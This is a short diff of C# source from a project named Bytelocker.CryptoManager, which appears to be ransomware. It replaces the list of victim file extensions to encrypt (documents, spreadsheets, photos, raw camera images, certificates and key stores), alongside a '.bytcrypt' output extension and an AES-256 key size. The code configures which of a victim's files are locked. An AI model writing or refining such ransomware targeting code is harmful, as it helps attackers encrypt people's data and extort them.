@@ -11,17 +11,11 @@ namespace Bytelocker.CryptoManager
         private byte[] salt;
 
         public static String FILE_EXTENSION_ENCRYPT = ".bytcrypt";
-        public static List<String> FILE_EXTENSIONS_TO_ENCRYPT = new List<string>(){ ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp",
-            ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata",
-            ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf",
-            ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor",
-            ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0",
-            ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik",
-            ".epk", ".rgss3a", ".pak", ".big",".wallet", ".wotreplay", ".xxx", ".desc", ".m3u", ".flv", ".rb", ".png", ".jpeg", ".txt", ".p7c",
-            ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref",
-            ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf",
-            ".pdd", ".psd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb",
-            ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"};
+        public static List<String> FILE_EXTENSIONS_TO_ENCRYPT = new List<string>(){".odt", ".ods", ".odp", ".odm", ".odc", ".odb", ".doc", ".docx", ".docm", ".wps", ".xls", ".xlsx", ".xlsm",
+            ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm", ".mdb", ".accdb", ".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".rtf", ".wb2", ".mdf", ".dbf", ".psd", ".pdd", ".pdf", ".eps", ".ai", ".indd",
+            ".cdr", ".jpg", ".jpe", ".jpg", ".dng", ".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2", ".dcr", ".kdc", ".erf", ".mef", ".mrw", ".nef", ".nrw", ".orf", ".raf", ".raw", ".rwl",
+            ".rw2", ".r3d", ".ptx", ".pef", ".srw", ".x3f", ".der", ".cer", ".crt", ".pem", ".pfx", ".p12", ".p7b", ".p7c"};
+
 
         private const int AES_KEYSIZE = 256;
         private const int WRITE_BUFFER = 1048576;
